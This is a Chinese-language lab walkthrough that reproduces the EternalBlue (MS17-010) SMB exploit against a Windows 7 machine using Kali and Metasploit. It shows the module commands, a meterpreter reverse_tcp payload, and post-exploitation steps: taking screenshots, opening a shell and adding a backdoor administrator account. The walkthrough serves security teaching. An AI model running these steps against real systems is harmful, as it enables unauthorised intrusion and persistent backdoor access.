永恒之蓝是指 2017 年 4 月 14 日晚，黑客团体 Shadow Brokers（影子经纪人）公布的一大批网络攻击工具。其中包含 “永恒之蓝” 工具，“永恒之蓝” 利用 Windows 系统的 SMB 漏洞可以获取系统最高权限。

而后有不法分子通过改造 “永恒之蓝” 制作出了 wannacry 勒索病毒，肆虐众多国家。

国内多个高校校内网、大型企业内网和政府机构专网均有中招。

还记得当时网上到处都是这张被勒索的图。

今天来复现一下该漏洞。

环境准备：

  • 攻击者机器：Kali，192.168.0.105
  • 受害者机器：Win 7，192.168.0.103

永恒之蓝利用 SMB 漏洞进行攻击，所以需要确保目标机器开放了 445 端口。

使用 nmap 快速探测目标端口。

可以看到 445 端口是开放的，那么可以继续接下来的渗透了。

输入 msfconsole 启动 Metasploit Framework。

进入 Metasploit Framework 后，在 msf 控制台输入 search ms17_010 搜索永恒之蓝相关漏洞。

使用永恒之蓝漏洞模块。

use exploit/windows/smb/ms17_010_eternalblue

输入 show options 查看该漏洞模块需要的参数。

可以看到基本参数都已默认设置好。LHOST 已经填上了本机地址，Payload 也已经默认设置了 windows/x64/meterpreter/reverse_tcp，只需设置一下目标机器 RHOSTS 即可。

set RHOSTS 192.168.0.103

输入 run 开始攻击。

出现如下输出，漏洞利用成功。

接下来就可以对目标进行截图、获取 shell、添加后门等一系列操作。

输入 screenshot 截图。

成功截图并保存到了 root 目录。

查看截图内容。

输入 shell 获取 shell。

添加一个管理员用户。

添加成功，可以看到登录界面多了一个刚刚添加的用户 asd。

以上就是完整的漏洞利用过程了。
